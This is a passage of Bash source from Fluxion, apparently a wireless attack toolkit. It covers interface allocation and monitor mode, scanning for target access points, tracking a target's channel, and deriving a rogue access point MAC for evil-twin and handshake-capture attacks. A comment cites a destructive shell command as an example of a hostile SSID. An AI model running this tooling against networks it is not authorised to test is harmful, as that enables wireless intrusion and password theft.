    io_dynamic_output "$FLUXIONDeallocatingInterfaceNotice"
  )"$CClr"

  if interface_is_wireless $oldIdentifier; then
    # If interface was allocated by airmon-ng, deallocate with it.
    if [[ "$oldIdentifier" == *"mon"* || "$oldIdentifier" == "prism"* ]]; then
      if ! airmon-ng stop $oldIdentifier &> $FLUXIONOutputDevice; then
        return 4
      fi
    else
      # Attempt deactivating monitor mode on the interface.
      if ! interface_set_mode $oldIdentifier managed; then
        return 3
      fi

      # Attempt to restore the original interface identifier.
      if ! interface_reidentify "$oldIdentifier" "$newIdentifier"; then
        return 5
      fi
    fi
  fi

  # Once successfully renamed, remove from allocation table.
  unset FluxionInterfaces[$oldIdentifier]
  unset FluxionInterfaces[$newIdentifier]
}

# Parameters: <interface_identifier>
# ------------------------------------------------------------ #
# Return 1: No interface identifier was passed.
# Return 2: Interface identifier given points to no interface.
# Return 3: Unable to determine interface's driver.
# Return 4: Fluxion failed to reidentify interface.
# Return 5: Interface allocation failed (identifier missing).
fluxion_allocate_interface() { # Reserve interfaces
  if [ ! "$1" ]; then
    echo "Allocation failed: no identifier" >> "$FLUXIONOutputDevice"
    return 1
  fi

  local -r identifier=$1
  echo "=== ALLOCATE: $identifier ===" >> "$FLUXIONOutputDevice"
  echo "FluxionInterfaces[$identifier] = '${FluxionInterfaces[$identifier]}'" >> "$FLUXIONOutputDevice"

  # If the interface is already in allocation table, we're done.
  if [ "${FluxionInterfaces[$identifier]+x}" ]; then
    echo "Interface already allocated: $identifier -> ${FluxionInterfaces[$identifier]}" >> "$FLUXIONOutputDevice"
    return 0
  fi

  if ! interface_is_real $identifier; then
    echo "Interface not real: $identifier" >> "$FLUXIONOutputDevice"
    return 2
  fi


  local interfaceIdentifier=$identifier
  echo -e "$CWht[$CSGrn+$CWht] "$(
    io_dynamic_output "$FLUXIONAllocatingInterfaceNotice"
  )"$CClr"


  if interface_is_wireless $identifier; then
    # Unblock wireless interfaces to make them available.
    echo -e "$FLUXIONVLine $FLUXIONUnblockingWINotice"
    rfkill unblock all &> $FLUXIONOutputDevice

    if [ "$FLUXIONWIReloadDriver" ]; then
      # Get selected interface's driver details/info-descriptor.
      echo -e "$FLUXIONVLine $FLUXIONGatheringWIInfoNotice"

      if ! interface_driver "$identifier"; then
        echo -e "$FLUXIONVLine$CRed $FLUXIONUnknownWIDriverError"
        sleep 3
        return 3
      fi

      # Notice: This local is function-scoped, not block-scoped.
      local -r driver="$InterfaceDriver"

      # Unload the driver module from the kernel.
      rmmod -f $driver &> $FLUXIONOutputDevice

      # Wait while interface becomes unavailable.
      echo -e "$FLUXIONVLine "$(
        io_dynamic_output $FLUXIONUnloadingWIDriverNotice
      )
      while interface_physical "$identifier"; do
        sleep 1
      done
    fi

    if [ "$FLUXIONWIKillProcesses" ]; then
      # Get list of potentially troublesome programs.
      echo -e "$FLUXIONVLine $FLUXIONFindingConflictingProcessesNotice"

      # Kill potentially troublesome programs.
      echo -e "$FLUXIONVLine $FLUXIONKillingConflictingProcessesNotice"

      # TODO: Make the loop below airmon-ng independent.
      # Maybe replace it with a list of network-managers?
      # WARNING: Version differences could break code below.
      for program in "$(airmon-ng check | awk 'NR>6{print $2}')"; do
        killall "$program" &> $FLUXIONOutputDevice
      done
    fi

    if [ "$FLUXIONWIReloadDriver" ]; then
      # Reload the driver module into the kernel.
      modprobe "$driver" &> $FLUXIONOutputDevice

      # Wait while interface becomes available.
      echo -e "$FLUXIONVLine "$(
        io_dynamic_output $FLUXIONLoadingWIDriverNotice
      )
      while ! interface_physical "$identifier"; do
        sleep 1
      done
    fi

    # Set wireless flag to prevent having to re-query.
    local -r allocatingWirelessInterface=1
  fi

  # If we're using the interface library, reidentify now.
  # If usuing airmon-ng, let airmon-ng rename the interface.
  if [ ! $FLUXIONAirmonNG ]; then
    echo -e "$FLUXIONVLine $FLUXIONReidentifyingInterface"

    # Prevent interface-snatching by renaming the interface.
    if [ $allocatingWirelessInterface ]; then
      # Get next wireless interface to add to FluxionInterfaces global.
      fluxion_next_assignable_interface fluxwl
    else
      # Get next ethernet interface to add to FluxionInterfaces global.
      fluxion_next_assignable_interface fluxet
    fi

    interface_reidentify $identifier $FluxionNextAssignableInterface
    local reidentify_result=$?

    if [ $reidentify_result -ne 0 ]; then # If reidentifying failed, abort immediately.
      return 4
    fi
  fi

  if [ $allocatingWirelessInterface ]; then
    # Activate wireless interface monitor mode and save identifier.
    echo -e "$FLUXIONVLine $FLUXIONStartingWIMonitorNotice"

    # TODO: Consider the airmon-ng flag is set, monitor mode is
    # already enabled on the interface being allocated, and the
    # interface identifier is something non-airmon-ng standard.
    # The interface could already be in use by something else.
    # Snatching or crashing interface issues could occur.

    # NOTICE: Conditionals below populate newIdentifier on success.
    if [ $FLUXIONAirmonNG ]; then
      local -r newIdentifier=$(
        airmon-ng start $identifier |
        grep "monitor .* enabled" |
        grep -oP "wl[a-zA-Z0-9]+mon|mon[0-9]+|prism[0-9]+"
      )
    else
      # Attempt activating monitor mode on the interface.
      if interface_set_mode $FluxionNextAssignableInterface monitor; then
        # Register the new identifier upon consecutive successes.
        local -r newIdentifier=$FluxionNextAssignableInterface
      else
        # If monitor-mode switch fails, undo rename and abort.
        interface_reidentify $FluxionNextAssignableInterface $identifier
      fi
    fi
  fi

  # On failure to allocate the interface, we've got to abort.
  # Notice: If the interface was already in monitor mode and
  # airmon-ng is activated, WE didn't allocate the interface.
  if [ ! "$newIdentifier" -o "$newIdentifier" = "$identifier" ]; then
    echo -e "$FLUXIONVLine $FLUXIONInterfaceAllocationFailedError"
    sleep 3
    return 5
  fi

  # Register identifiers to allocation hash table.
  FluxionInterfaces[$newIdentifier]=$identifier
  FluxionInterfaces[$identifier]=$newIdentifier

  echo -e "$FLUXIONVLine $FLUXIONInterfaceAllocatedNotice"
  sleep 3

  # Notice: Interfaces are accessed with their original identifier
  # as the key for the global FluxionInterfaces hash/map/dictionary.
}

# Parameters: <interface_prefix>
# Description: Prints next available assignable interface name.
# ------------------------------------------------------------ #
fluxion_next_assignable_interface() {
  # Find next available interface by checking global hash AND physical interfaces
  local -r prefix=$1
  local index=0
  while [ "${FluxionInterfaces[$prefix$index]}" ] || interface_physical "$prefix$index"; do
    let index++
  done
  FluxionNextAssignableInterface="$prefix$index"
}

# Parameters: <interfaces:lambda> [<query>]
# Note: The interfaces lambda must print an interface per line.
# ------------------------------------------------------------ #
# Return -1: Go back
# Return  1: Missing interfaces lambda identifier (not passed).
fluxion_get_interface() {
  if ! type -t "$1" &> /dev/null; then return 1; fi

  if [ "$2" ]; then
    local -r interfaceQuery="$2"
  else
    local -r interfaceQuery=$FLUXIONInterfaceQuery
  fi

  while true; do
    local candidateInterfaces
    readarray -t candidateInterfaces < <($1)
    local interfacesAvailable=()
    local interfacesAvailableInfo=()
    local interfacesAvailableColor=()
    local interfacesAvailableState=()

    # Gather information from all available interfaces.
    local candidateInterface
    for candidateInterface in "${candidateInterfaces[@]}"; do
      if [ ! "$candidateInterface" ]; then
        local skipOption=1
        continue
      fi

      interface_chipset "$candidateInterface"
      interfacesAvailableInfo+=("$InterfaceChipset")

      # If it has already been allocated, we can use it at will.
      local candidateInterfaceAlt=${FluxionInterfaces["$candidateInterface"]}
      if [ "$candidateInterfaceAlt" ]; then
        # The candidate is already allocated. Show it regardless of whether
        # it's the original or renamed interface. User will select by what they see.
        interfacesAvailable+=("$candidateInterface")

        interfacesAvailableColor+=("$CGrn")
        interfacesAvailableState+=("[*]")
      else
        interfacesAvailable+=("$candidateInterface")

        interface_state "$candidateInterface"

        if [ "$InterfaceState" = "up" ]; then
          interfacesAvailableColor+=("$CPrp")
          interfacesAvailableState+=("[-]")
        else
          interfacesAvailableColor+=("$CClr")
          interfacesAvailableState+=("[+]")
        fi
      fi
    done

    # Auto-select first available interface in smart/auto mode
    if [ "${#interfacesAvailable[@]}" -ge 1 ] && \
       [ "${interfacesAvailableState[0]}" != "[-]" ] && \
       ([ "$FLUXIONSmartMode" ] || [ "$FLUXIONAutoCapture" ] || [ "$FLUXIONAuto" ]); then
      FluxionInterfaceSelected="${interfacesAvailable[0]}"
      FluxionInterfaceSelectedState="${interfacesAvailableState[0]}"
      FluxionInterfaceSelectedInfo="${interfacesAvailableInfo[0]}"
      echo "Auto mode: selected interface $FluxionInterfaceSelected" > $FLUXIONOutputDevice
      break
    fi

    # If only one interface exists and it's not unavailable, choose it.
    if [ "${#interfacesAvailable[@]}" -eq 1 -a \
      "${interfacesAvailableState[0]}" != "[-]" -a \
      "$skipOption" == "" ]; then FluxionInterfaceSelected="${interfacesAvailable[0]}"
      FluxionInterfaceSelectedState="${interfacesAvailableState[0]}"
      FluxionInterfaceSelectedInfo="${interfacesAvailableInfo[0]}"
      break
    else
      if [ $skipOption ]; then
        interfacesAvailable+=("$FLUXIONGeneralSkipOption")
        interfacesAvailableColor+=("$CClr")
      fi

      interfacesAvailable+=(
        "$FLUXIONGeneralRepeatOption"
        "$FLUXIONGeneralBackOption"
      )

      interfacesAvailableColor+=(
        "$CClr"
        "$CClr"
      )

      format_apply_autosize \
        "$CRed[$CSYel%1d$CClr$CRed]%b %-8b %3s$CClr %-*.*s\n"

      io_query_format_fields \
        "$FLUXIONVLine $interfaceQuery" "$FormatApplyAutosize" \
        interfacesAvailableColor[@] interfacesAvailable[@] \
        interfacesAvailableState[@] interfacesAvailableInfo[@]

      echo

      case "${IOQueryFormatFields[1]}" in
        "$FLUXIONGeneralSkipOption")
          FluxionInterfaceSelected=""
          FluxionInterfaceSelectedState=""
          FluxionInterfaceSelectedInfo=""
          return 0;;
        "$FLUXIONGeneralRepeatOption") continue;;
        "$FLUXIONGeneralBackOption") return -1;;
        *)
          FluxionInterfaceSelected="${IOQueryFormatFields[1]}"
          FluxionInterfaceSelectedState="${IOQueryFormatFields[2]}"
          FluxionInterfaceSelectedInfo="${IOQueryFormatFields[3]}"
          break;;
      esac
    fi
  done
}


# ============== < Fluxion Target Subroutines > ============== #
# Parameters: interface [ channel(s) [ band(s) ] ]
# ------------------------------------------------------------ #
# Return 1: Missing monitor interface.
# Return 2: Xterm failed to start airmon-ng.
# Return 3: Invalid capture file was generated.
# Return 4: No candidates were detected.
fluxion_target_get_candidates() {
  # Assure a valid wireless interface for scanning was given.
  if [ ! "$1" ] || ! interface_is_wireless "$1"; then return 1; fi

  echo -e "$FLUXIONVLine $FLUXIONStartingScannerNotice"
  echo -e "$FLUXIONVLine $FLUXIONStartingScannerTip"

  # Assure all previous scan results have been cleared.
  sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"

  #if [ "$FLUXIONAuto" ]; then
  #  sleep 30 && killall xterm &
  #fi

  # Begin scanner and output all results to "dump-01.csv."
  local channelParam="${2:+--channel $2}"
  local bandParam="${3:+--band $3}"
if ! xterm -title "$FLUXIONScannerHeader" $TOPLEFTBIG \
    -bg "#000000" -fg "#FFFFFF" -e \
    "airodump-ng -Mat WPA $channelParam $bandParam -w \"$FLUXIONWorkspacePath/dump\" $1" 2> $FLUXIONOutputDevice; then
    echo -e "$FLUXIONVLine$CRed $FLUXIONGeneralXTermFailureError"
    sleep 5
    return 2
fi

  # Sanity check the capture files generated by the scanner.
  # If the file doesn't exist, or if it's empty, abort immediately.
  if [ ! -f "$FLUXIONWorkspacePath/dump-01.csv" -o \
    ! -s "$FLUXIONWorkspacePath/dump-01.csv" ]; then
    sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"
    return 3
  fi

  # Syntheize scan opeFLUXIONWindowRation results from output file "dump-01.csv."
  echo -e "$FLUXIONVLine $FLUXIONPreparingScannerResultsNotice"
  # WARNING: The code below may break with different version of airmon-ng.
  # The times matching operator "{n}" isn't supported by mawk (alias awk).
  # readarray FLUXIONTargetCandidates < <(
  #   gawk -F, 'NF==15 && $1~/([A-F0-9]{2}:){5}[A-F0-9]{2}/ {print $0}'
  #   $FLUXIONWorkspacePath/dump-01.csv
  # )
  # readarray FLUXIONTargetCandidatesClients < <(
  #   gawk -F, 'NF==7 && $1~/([A-F0-9]{2}:){5}[A-F0-9]{2}/ {print $0}'
  #   $FLUXIONWorkspacePath/dump-01.csv
  # )
  local -r matchMAC="([A-F0-9][A-F0-9]:)+[A-F0-9][A-F0-9]"
  readarray FluxionTargetCandidates < <(
    awk -F, "NF>=15 && length(\$1)==17 && \$1~/$matchMAC/ {print \$0}" \
    "$FLUXIONWorkspacePath/dump-01.csv"
  )
  readarray FluxionTargetCandidatesClients < <(
    awk -F, "NF==7 && length(\$1)==17 && \$1~/$matchMAC/ {print \$0}" \
    "$FLUXIONWorkspacePath/dump-01.csv"
  )

  # Note: Don't cleanup dump* files yet - we need dump-01.kismet.netxml
  # for vendor lookup in fluxion_get_target()

  if [ ${#FluxionTargetCandidates[@]} -eq 0 ]; then
    # Cleanup on failure
    sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"
    echo -e "$FLUXIONVLine $FLUXIONScannerDetectedNothingNotice"
    sleep 3
    return 4
  fi
}


fluxion_get_target() {
  # Assure a valid wireless interface for scanning was given.
  if [ ! "$1" ] || ! interface_is_wireless "$1"; then return 1; fi

  local -r interface=$1

  local choices=( \
    "$FLUXIONScannerChannelOptionAll (2.4GHz)" \
    "$FLUXIONScannerChannelOptionAll (5GHz)" \
    "$FLUXIONScannerChannelOptionAll (2.4GHz & 5Ghz)" \
    "$FLUXIONScannerChannelOptionSpecific" "$FLUXIONGeneralBackOption"
  )

  io_query_choice "$FLUXIONScannerChannelQuery" choices[@]

  echo

  case "$IOQueryChoice" in
    "$FLUXIONScannerChannelOptionAll (2.4GHz)")
      fluxion_target_get_candidates $interface "" "bg";;

    "$FLUXIONScannerChannelOptionAll (5GHz)")
      fluxion_target_get_candidates $interface "" "a";;

    "$FLUXIONScannerChannelOptionAll (2.4GHz & 5Ghz)")
      fluxion_target_get_candidates $interface "" "abg";;

    "$FLUXIONScannerChannelOptionSpecific")
      fluxion_header

      echo -e "$FLUXIONVLine $FLUXIONScannerChannelQuery"
      echo
      echo -e "     $FLUXIONScannerChannelSingleTip ${CBlu}6$CClr               "
      echo -e "     $FLUXIONScannerChannelMiltipleTip ${CBlu}1-5$CClr             "
      echo -e "     $FLUXIONScannerChannelMiltipleTip ${CBlu}1,2,5-7,11$CClr      "
      echo
      echo -ne "$FLUXIONPrompt"

      local channels
      read channels

      echo

      # Determine band based on channel number
      # Channels 1-14 are 2.4GHz (band bg), 36+ are 5GHz (band a)
      local band=""
      local firstChannel=$(echo "$channels" | grep -oE '[0-9]+' | head -1)
      if [ -n "$firstChannel" ]; then
        if [ "$firstChannel" -le 14 ]; then
          band="bg"
        else
          band="a"
        fi
      fi

      fluxion_target_get_candidates $interface $channels "$band";;

    "$FLUXIONGeneralBackOption")
      return -1;;
  esac

  # Abort if errors occured while searching for candidates.
  if [ $? -ne 0 ]; then return 2; fi

  local candidatesMAC=()
  local candidatesClientsCount=()
  local candidatesChannel=()
  local candidatesSecurity=()
  local candidatesSignal=()
  local candidatesPower=()
  local candidatesESSID=()
  local candidatesColor=()
  local candidatesVendor=()
  local candidatesHandshake=()

  # Build list of BSSIDs that already have valid handshakes
  local -A existingHandshakes
  local -r handshakeDir="$FLUXIONPath/attacks/Handshake Snooper/handshakes"
  if [ -d "$handshakeDir" ]; then
    local handshakeFile
    for handshakeFile in "$handshakeDir"/*.cap; do
      if [ -f "$handshakeFile" ] && [ -s "$handshakeFile" ]; then
        # Extract BSSID from filename (format: *<BSSID>.cap)
        local filename=$(basename "$handshakeFile")
        # Match MAC address pattern at end before .cap
        if [[ "$filename" =~ ([A-F0-9]{2}:[A-F0-9]{2}:[A-F0-9]{2}:[A-F0-9]{2}:[A-F0-9]{2}:[A-F0-9]{2})\.cap$ ]]; then
          local bssid="${BASH_REMATCH[1]}"
          # Store both uppercase and lowercase versions for matching
          existingHandshakes["${bssid^^}"]=1
          existingHandshakes["${bssid,,}"]=1
        fi
      fi
    done
  fi

  # Build vendor lookup table from kismet netxml file if it exists
  local -A vendorLookup
  if [ -f "$FLUXIONWorkspacePath/dump-01.kismet.netxml" ]; then
    # Extract MAC and manuf pairs from netxml file
    # Each wireless-network block has <BSSID> followed by <manuf>
    while IFS= read -r line; do
      if [[ "$line" =~ \<BSSID\>([A-F0-9:]+)\</BSSID\> ]]; then
        local currentMAC="${BASH_REMATCH[1]}"
      elif [[ "$line" =~ \<manuf\>(.+)\</manuf\> ]] && [ -n "$currentMAC" ]; then
        local manufName="${BASH_REMATCH[1]}"
        # Decode HTML entities (e.g., &amp; -> &)
        manufName=$(echo "$manufName" | sed 's/&amp;/\&/g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/"/g')
        vendorLookup["$currentMAC"]="$manufName"
        currentMAC=""
      fi
    done < "$FLUXIONWorkspacePath/dump-01.kismet.netxml"
  fi

  # Gather information from all the candidates detected.
  # TODO: Clean up this for loop using a cleaner algorithm.
  # Maybe try using array appending & [-1] for last elements.
  local filteredCount=0
  for candidateAPInfo in "${FluxionTargetCandidates[@]}"; do
    # Strip candidate info from any extraneous spaces after commas.
    candidateAPInfo=$(echo "$candidateAPInfo" | sed -r "s/,\s*/,/g")

    local candidateMAC=$(echo "$candidateAPInfo" | cut -d , -f 1)
    
    # For Handshake Snooper: skip networks with existing handshakes
    # For other attacks: mark them but don't skip
    if [ -n "${existingHandshakes[$candidateMAC]}" ]; then
      if [ "$FluxionAttack" = "Handshake Snooper" ]; then
        ((filteredCount++))
        continue
      fi
    fi

    local i=${#candidatesMAC[@]}

    candidatesMAC[i]="$candidateMAC"
    
    # Look up vendor from kismet netxml file first, fallback to macchanger
    if [ -n "${vendorLookup[${candidatesMAC[i]}]}" ]; then
      local vendor="${vendorLookup[${candidatesMAC[i]}]}"
      # Don't show "Unknown" vendors - leave empty instead
      if [ "$vendor" != "Unknown" ]; then
        candidatesVendor[i]="$vendor"
      else
        candidatesVendor[i]=""
      fi
    else
      # Fallback to macchanger OUI lookup
      local makerID=${candidatesMAC[i]:0:8}
      candidatesVendor[i]=$(
        macchanger -l 2>/dev/null |
        grep -i "${makerID,,}" |
        cut -d ' ' -f 5- |
        head -n 1
      )
      # Leave empty if no vendor found (don't show "Unknown")
    fi
    candidatesClientsCount[i]=$(
      echo "${FluxionTargetCandidatesClients[@]}" |
      grep -c "${candidatesMAC[i]}"
    )
    candidatesChannel[i]=$(echo "$candidateAPInfo" | cut -d , -f 4)
    candidatesSecurity[i]=$(echo "$candidateAPInfo" | cut -d , -f 6)
    candidatesPower[i]=$(echo "$candidateAPInfo" | cut -d , -f 9)
    candidatesColor[i]=$(
      [ ${candidatesClientsCount[i]} -gt 0 ] && echo $CGrn || echo $CClr
    )

    # Parse any non-ascii characters by letting bash handle them.
    # Escape all single quotes in ESSID and let bash's $'...' handle it.
    local sanitizedESSID=$(
      echo "${candidateAPInfo//\'/\\\'}" | cut -d , -f 14
    )
    candidatesESSID[i]=$(eval "echo \$'$sanitizedESSID'")
    
    # Mark networks with existing handshakes with asterisk
    if [ "$FluxionAttack" != "Handshake Snooper" ] && [ -n "${existingHandshakes[$candidateMAC]}" ]; then
      candidatesHandshake[i]="*"
    else
      candidatesHandshake[i]=" "
    fi

    local power=${candidatesPower[i]}
    if [ $power -eq -1 ]; then
      # airodump-ng's man page says -1 means unsupported value.
      candidatesQuality[i]="??"
    elif [ $power -le $FLUXIONNoiseFloor ]; then
      candidatesQuality[i]=0
    elif [ $power -gt $FLUXIONNoiseCeiling ]; then
      candidatesQuality[i]=100
    else
      # Bash doesn't support floating point division, work around it...
      # Q = ((P - F) / (C - F)); Q-quality, P-power, F-floor, C-Ceiling.
      candidatesQuality[i]=$(( \
        (${candidatesPower[i]} * 10 - $FLUXIONNoiseFloor * 10) / \
        (($FLUXIONNoiseCeiling - $FLUXIONNoiseFloor) / 10) \
      ))
    fi
  done

  # Check if all networks were filtered out
  if [ ${#candidatesMAC[@]} -eq 0 ]; then
    local emptyMessage=""
    if [ $filteredCount -gt 0 ]; then
      emptyMessage="${CYel}All $filteredCount network(s) on this channel have existing handshakes.$CClr\n"
      emptyMessage+="${CYel}Please scan a different channel or delete existing handshakes.$CClr\n\n"
    else
      emptyMessage="${CRed}No networks found on this channel.$CClr\n\n"
    fi

    if ! io_query_choice "$emptyMessage" \
      "$FLUXIONGeneralBackOption"; then
      return 1
    fi

    return 1
  fi

  format_center_literals "WIFI LIST"
  local headerTitle="$FormatCenterLiterals\n\n"

  # Add notice if networks were filtered
  if [ $filteredCount -gt 0 ]; then
    headerTitle+="${CYel}Note: $filteredCount network(s) with existing handshakes were filtered$CClr\n\n"
  fi

  format_apply_autosize "$CRed[$CSYel ** $CClr$CRed]$CClr %2s %-*.*s %4s %3s %3s %2s %-8.8s %17s %-30.30s\n"
  local -r headerFields=$(
    printf "$FormatApplyAutosize" \
      "HS" "ESSID" "QLTY" "PWR" "STA" "CH" "SECURITY" "BSSID" "VENDOR"
  )

  format_apply_autosize "$CRed[$CSYel%03d$CClr$CRed]%b %2s %-*.*s %3s%% %3s %3d %2s %-8.8s %17s %-30.30s\n"
  io_query_format_fields "$headerTitle$headerFields" \
   "$FormatApplyAutosize" \
    candidatesColor[@] \
    candidatesHandshake[@] \
    candidatesESSID[@] \
    candidatesQuality[@] \
    candidatesPower[@] \
    candidatesClientsCount[@] \
    candidatesChannel[@] \
    candidatesSecurity[@] \
    candidatesMAC[@] \
    candidatesVendor[@]

  echo

  FluxionTargetMAC=${IOQueryFormatFields[8]}
  FluxionTargetSSID=${IOQueryFormatFields[2]}
  FluxionTargetChannel=${IOQueryFormatFields[6]}

  FluxionTargetEncryption=${IOQueryFormatFields[7]}
  
  # Get vendor from the selection (IOQueryFormatFields[9] is the vendor column)
  FluxionTargetMaker=${IOQueryFormatFields[9]}

  # Cleanup airodump-ng output files after vendor lookup is complete
  sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"

  FluxionTargetMakerID=${FluxionTargetMAC:0:8}
  
  # If vendor wasn't found in kismet/list, fallback to macchanger lookup
  if [ -z "$FluxionTargetMaker" ]; then
    FluxionTargetMaker=$(
      macchanger -l |
      grep ${FluxionTargetMakerID,,} 2> $FLUXIONOutputDevice |
      cut -d ' ' -f 5-
    )
  fi

  FluxionTargetSSIDClean=$(fluxion_target_normalize_SSID)

  # We'll change a single hex digit from the target AP's MAC address.
  # This new MAC address will be used as the rogue AP's MAC address.
  local -r rogueMACHex=$(printf %02X $((0x${FluxionTargetMAC:13:1} + 1)))
  FluxionTargetRogueMAC="${FluxionTargetMAC::13}${rogueMACHex:1:1}${FluxionTargetMAC:14:4}"
}

fluxion_target_normalize_SSID() {
  # Sanitize network ESSID to make it safe for manipulation.
  # Notice: Why remove these? Some smartass might decide to name their
  # network "; rm -rf / ;". If the string isn't sanitized accidentally
  # shit'll hit the fan and we'll have an extremly distressed user.
  # Replacing ' ', '/', '.', '~', '\' with '_'
  echo "$FluxionTargetSSID" | sed -r 's/( |\/|\.|\~|\\)+/_/g'
}

fluxion_target_show() {
  format_apply_autosize "%*s$CBlu%7s$CClr: %-32s%*s\n"

  local colorlessFormat="$FormatApplyAutosize"
  local colorfullFormat=$(
    echo "$colorlessFormat" | sed -r 's/%-32s/%-32b/g'
  )

  printf "$colorlessFormat" "" "ESSID" "\"${FluxionTargetSSID:-[N/A]}\" / ${FluxionTargetEncryption:-[N/A]}" ""
  printf "$colorlessFormat" "" "Channel" " ${FluxionTargetChannel:-[N/A]}" ""
  printf "$colorfullFormat" "" "BSSID" " ${FluxionTargetMAC:-[N/A]} ($CYel${FluxionTargetMaker:-[N/A]}$CClr)" ""

  echo
}

fluxion_target_tracker_daemon() {
  if [ ! "$1" ]; then return 1; fi # Assure we've got fluxion's PID.

  readonly fluxionPID=$1
  readonly monitorTimeout=10 # In seconds.
  readonly capturePath="$FLUXIONWorkspacePath/tracker_capture"

  echo "[T-Tracker] === DAEMON STARTED ===" > $FLUXIONOutputDevice
  echo "[T-Tracker] Fluxion PID: $fluxionPID" > $FLUXIONOutputDevice
  echo "[T-Tracker] Tracker Interface: $FluxionTargetTrackerInterface" > $FLUXIONOutputDevice
  echo "[T-Tracker] Target MAC: $FluxionTargetMAC" > $FLUXIONOutputDevice
  echo "[T-Tracker] Target SSID: $FluxionTargetSSID" > $FLUXIONOutputDevice
  echo "[T-Tracker] Current Channel: $FluxionTargetChannel" > $FLUXIONOutputDevice

  if [ \
    -z "$FluxionTargetMAC" -o \
    -z "$FluxionTargetSSID" -o \
    -z "$FluxionTargetChannel" ]; then
    echo "[T-Tracker] ERROR: Missing target info, aborting." > $FLUXIONOutputDevice
    return 2 # If we're missing target information, we can't track properly.
  fi

  while true; do
    echo "[T-Tracker] Scanning all channels for $monitorTimeout seconds..." > $FLUXIONOutputDevice
    # Use --band abg to scan all 2.4GHz and 5GHz channels to detect channel hopping
    # Redirect stdin from /dev/null to prevent SIGTTIN stopping the background process
    timeout $monitorTimeout airodump-ng --band abg -aw "$capturePath" \
      -d "$FluxionTargetMAC" $FluxionTargetTrackerInterface </dev/null &>/dev/null
    local error=$? # Catch the returned status error code.

    echo "[T-Tracker] airodump-ng exited with code: $error" > $FLUXIONOutputDevice

    # Exit code 124 means timeout expired (expected), 143 means SIGTERM (also from timeout)
    # Only abort on unexpected errors (not 0, 124, or 143)
    if [ $error -ne 0 ] && [ $error -ne 124 ] && [ $error -ne 143 ]; then
      echo -e "[T-Tracker] ${CRed}Error:$CClr Operation aborted (code: $error)!" > $FLUXIONOutputDevice
      break
    fi

    local targetInfo=$(head -n 3 "$capturePath-01.csv" 2>/dev/null | tail -n 1)
    sandbox_remove_workfile "$capturePath-*"

    local targetChannel=$(
      echo "$targetInfo" | awk -F, '{gsub(/ /, "", $4); print $4}'
    )

    echo "[T-Tracker] Raw info: $targetInfo" > $FLUXIONOutputDevice
    echo "[T-Tracker] Detected channel: '$targetChannel' (expected: '$FluxionTargetChannel')" > $FLUXIONOutputDevice

    # Skip comparison if targetChannel is empty or invalid (-1 means no channel locked)
    if [ -z "$targetChannel" ] || [ "$targetChannel" = "-1" ]; then
      echo "[T-Tracker] Target not found or channel invalid, retrying..." > $FLUXIONOutputDevice
      continue
    fi

    if [ "$targetChannel" -ne "$FluxionTargetChannel" ] 2>/dev/null; then
      echo "[T-Tracker] !!! CHANNEL CHANGE DETECTED: $FluxionTargetChannel -> $targetChannel !!!" > $FLUXIONOutputDevice
      FluxionTargetChannel=$targetChannel
      break
    fi

    echo "[T-Tracker] Channel unchanged, continuing to monitor..." > $FLUXIONOutputDevice

    # NOTE: We might also want to check for SSID changes here, assuming the only
    # thing that remains constant is the MAC address. The problem with that is
    # that airodump-ng has some serious problems with unicode, apparently.
    # Try feeding it an access point with Chinese characters and check the .csv.
  done

  # Save/overwrite the new target information to the workspace for retrival.
  echo "$FluxionTargetMAC" > "$FLUXIONWorkspacePath/target_info.txt"
  echo "$FluxionTargetSSID" >> "$FLUXIONWorkspacePath/target_info.txt"
  echo "$FluxionTargetChannel" >> "$FLUXIONWorkspacePath/target_info.txt"

  # NOTICE: Using different signals for different things is a BAD idea.
  # We should use a single signal, SIGINT, to handle different situations.
  kill -s SIGALRM $fluxionPID # Signal fluxion a change was detected.

  sandbox_remove_workfile "$capturePath-*"
}

fluxion_target_tracker_stop() {
  if [ ! "$FluxionTargetTrackerDaemonPID" ]; then return 1; fi
  kill -s SIGABRT $FluxionTargetTrackerDaemonPID &> /dev/null
  FluxionTargetTrackerDaemonPID=""
}

fluxion_target_tracker_start() {
  if [ ! "$FluxionTargetTrackerInterface" ]; then
    return 1
  fi

  fluxion_target_tracker_daemon $$ &> $FLUXIONOutputDevice &
  FluxionTargetTrackerDaemonPID=$!
}

fluxion_target_unset_tracker() {
  if [ ! "$FluxionTargetTrackerInterface" ]; then return 1; fi

  FluxionTargetTrackerInterface=""
}

fluxion_target_set_tracker() {
  if [ "$FluxionTargetTrackerInterface" ]; then
    echo "Tracker interface already set, skipping." > $FLUXIONOutputDevice
    return 0
  fi

  # Auto-skip tracker in smart/auto modes
  if [ "$FLUXIONSmartMode" ] || [ "$FLUXIONAutoCapture" ] || [ "$FLUXIONAuto" ]; then
    echo "Auto mode: skipping tracker interface selection" > $FLUXIONOutputDevice
    return 0
  fi

  # Check if attack provides tracking interfaces, get & set one.
  if ! type -t attack_tracking_interfaces &> /dev/null; then
    echo "Tracker DOES NOT have interfaces available!" > $FLUXIONOutputDevice
    return 1
  fi

  if [ "$FluxionTargetTrackerInterface" == "" ]; then
    echo "Running get interface (tracker)." > $FLUXIONOutputDevice
    local -r interfaceQuery=$FLUXIONTargetTrackerInterfaceQuery
    local -r interfaceQueryTip=$FLUXIONTargetTrackerInterfaceQueryTip
    local -r interfaceQueryTip2=$FLUXIONTargetTrackerInterfaceQueryTip2
    if ! fluxion_get_interface attack_tracking_interfaces \
      "$interfaceQuery\n$FLUXIONVLine $interfaceQueryTip\n$FLUXIONVLine $interfaceQueryTip2"; then
      echo "Failed to get tracker interface!" > $FLUXIONOutputDevice
      return 2
    fi
    local selectedInterface=$FluxionInterfaceSelected
  else
    # Assume user passed one via the command line and move on.
    # If none was given we'll take care of that case below.
    local selectedInterface=$FluxionTargetTrackerInterface
    echo "Tracker interface passed via command line!" > $FLUXIONOutputDevice
  fi

  # If user skipped a tracker interface, move on.
  if [ ! "$selectedInterface" ]; then
    fluxion_target_unset_tracker
    return 0
  fi

  if ! fluxion_allocate_interface $selectedInterface; then
    echo "Failed to allocate tracking interface!" > $FLUXIONOutputDevice
    return 3
  fi

  echo "Successfully got tracker interface." > $FLUXIONOutputDevice
  echo "selectedInterface='$selectedInterface'" >> $FLUXIONOutputDevice
  echo "FluxionInterfaces[$selectedInterface]='${FluxionInterfaces[$selectedInterface]}'" >> $FLUXIONOutputDevice

